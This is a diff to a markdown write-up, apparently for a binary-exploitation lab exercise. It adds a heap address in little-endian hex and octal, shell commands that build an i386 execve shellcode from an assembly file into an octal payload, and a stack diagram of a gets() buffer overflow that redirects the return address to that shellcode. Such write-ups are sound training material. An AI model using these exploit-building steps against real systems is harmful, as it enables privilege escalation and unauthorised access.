@@ -104,6 +104,8 @@ ignore
 Temporary breakpoint 1, 0xb7ea8d30 in strdup () from /lib/i386-linux-gnu/libc.so.6
 0x0804853d in p ()
 eax: 0x804a008
+# hex => \x08\xa0\x04\x08
+# octal => \010\240\004\010
 ```
 
 ### Constraints
@@ -142,3 +144,44 @@ Due to environmental constraints, our control flow redirection is limited to the
 
 We decided that the most viable privilege escalation strategy would be to inject an [i386 `sys_execve()`](https://asm.sourceforge.net/syscall.html) [shellcode](https://en.wikipedia.org/wiki/Shellcode) payload in the **Heap** and redirect the code's execution flow there.
 
+Bulding a shellcode byte sequence manually (as an **little-endian hexadecimal or octal** encoded string) is too error-prone. Instead, we generate it from an assembled binary based on the following [exploit.asm](./Ressources/data/exploit.asm) script.
+
+The conversion can be done through the following set of commands
+```sh
+$ tmpdir=$(mktemp -d);
+$ asm_payload_filepath="./data/exploit.asm";
+
+# Compile the assembly program to an object file.
+$ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";
+
+# Link the object file into a binary.
+$ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";
+
+# Extract the content of the ELF .text section as raw bytes.
+$ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";
+
+# Format the bytes into an octal shellcode payload.
+# We use octal because dash's printf implementation does not support the '\xHH' escape format.
+$ octal_shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
+$ octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
+```
+
+We know have all the information needed to build the full exploit payload
+```sh
+     HIGHER MEMORY ADDRESSES    
++------------------------------+
+| Return Address               | (4 bytes)
+| -> Points to payload in heap |
++------------------------------+
+| EBP filler                   | (4 bytes)
++------------------------------+
+| Local variables              |
+|                              |
+| +---------------+            |
+| | Buffer filler | (51 bytes) | (76 bytes)
+| +---------------+            |
+| |   Shellcode   | (25 bytes) |
+| +---------------+            |
+|-+---------------+------------+ <--- `gets()` buffer start
+     LOWER MEMORY ADDRESSES     
+```
